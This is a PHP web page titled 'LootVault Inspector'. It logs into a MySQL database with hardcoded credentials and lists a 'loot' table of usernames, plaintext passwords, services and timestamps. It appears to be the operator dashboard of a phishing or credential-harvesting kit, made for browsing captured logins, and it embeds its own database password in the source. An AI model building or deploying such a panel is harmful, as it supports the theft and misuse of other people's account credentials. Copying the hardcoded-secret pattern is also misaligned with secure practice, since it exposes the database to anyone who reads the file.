<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>LootVault Inspector</title>
    <style>
        :root {
            --primary: #6d28d9;
            --secondary: #10b981;
            --dark: #1e293b;
            --light: #f8fafc;
        }
        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background: url('lootbackground.jpg') no-repeat center center fixed;
            background-size: cover;
            color: var(--dark);
            margin: 0;
            padding: 20px;
        }
.container {
            max-width: 1200px;
            margin: 0 auto;
            background-color: rgba(255, 255, 255, 0.85);
            border-radius: 10px;
            box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
            padding: 25px;
	    backdrop-filter: blur(2px);
        }
        
        h1 {
            color: var(--primary);
            text-align: center;
            margin-bottom: 30px;
            font-size: 2.2rem;
            border-bottom: 2px solid var(--secondary);
            padding-bottom: 10px;
        }
        
        .table-container {
            overflow-x: auto;
        }
        
        table {
            width: 100%;
            border-collapse: collapse;
            margin-top: 20px;
        }
        
        th {
            background-color: var(--primary);
            color: white;
            padding: 12px 15px;
            text-align: left;
            font-weight: 600;
        }
        
        td {
            padding: 12px 15px;
            border-bottom: 1px solid #e2e8f0;
        }
        
        tr:nth-child(even) {
            background-color: #f8fafc;
        }
        
        tr:hover {
            background-color: #f1f5f9;
            transition: background-color 0.2s ease;
        }
        
        .id-cell {
            text-align: center;
            font-family: 'Courier New', Courier, monospace;
        }
        
        .timestamp-cell {
            font-family: 'Courier New', Courier, monospace;
            font-size: 0.9em;
        }
        
        .error-message {
            background-color: #fee2e2;
            color: #b91c1c;
            padding: 15px;
            border-radius: 5px;
            margin-bottom: 20px;
            border-left: 4px solid #b91c1c;
        }
        
        .success-message {
            background-color: #dcfce7;
            color: #166534;
            padding: 15px;
            border-radius: 5px;
            margin-bottom: 20px;
            border-left: 4px solid #166534;
        }
        
        .empty-message {
            background-color: #e0f2fe;
            color: #0369a1;
            padding: 15px;
            border-radius: 5px;
            margin-bottom: 20px;
            border-left: 4px solid #0369a1;
            text-align: center;
        }
        
        .password-cell {
            font-family: 'Courier New', Courier, monospace;
            color: #dc2626;
        }
    </style>
</head>
<body>
    <div class="container" opacity="0.5">
        <h1>LootVault Inspector  🕵️‍♂️</h1>
        
        <?php
        $servername = "localhost";
        $username = "dpuser";
        $password = "Eggy123";
        $dbname = "DPPortal";
        
        try {
            // Create connection
            $conn = new mysqli($servername, $username, $password, $dbname);
            
            // Check connection
            if ($conn->connect_error) {
                throw new Exception("Connection failed: " . $conn->connect_error);
            }
            
            echo '<div class="success-message">Connected successfully to database</div>';
            
            // Perform query
            $sql = "SELECT * FROM loot";
            $result = $conn->query($sql);
            
            if ($result->num_rows > 0) {
                echo '<div class="table-container">';
                echo '<table>';
                echo '<thead>';
                echo '<tr>';
                echo '<th>ID</th>';
                echo '<th>Username</th>';
                echo '<th>Password</th>';
                echo '<th>Service</th>';
                echo '<th>Date/Time Stamp</th>';
                echo '</tr>';
                echo '</thead>';
                echo '<tbody>';
                
                // Output data of each row
                while($row = $result->fetch_assoc()) {
                    echo '<tr>';
                    echo '<td class="id-cell">' . htmlspecialchars($row["id"]) . '</td>';
                    echo '<td>' . htmlspecialchars($row["username"]) . '</td>';
                    echo '<td class="password-cell">' . htmlspecialchars($row["password"]) . '</td>';
                    echo '<td>' . htmlspecialchars($row["service"]) . '</td>';
                    echo '<td class="timestamp-cell">' . htmlspecialchars($row["datetimestamp"]) . '</td>';
                    echo '</tr>';
                }
                
                echo '</tbody>';
                echo '</table>';
                echo '</div>';
            } else {
                echo '<div class="empty-message">No records found in the loot table</div>';
            }
            
            // Close connection
            $conn->close();
            
        } catch (Exception $e) {
            echo '<div class="error-message">Error: ' . $e->getMessage() . '</div>';
        }
        ?>
    </div>
</body>
</html>
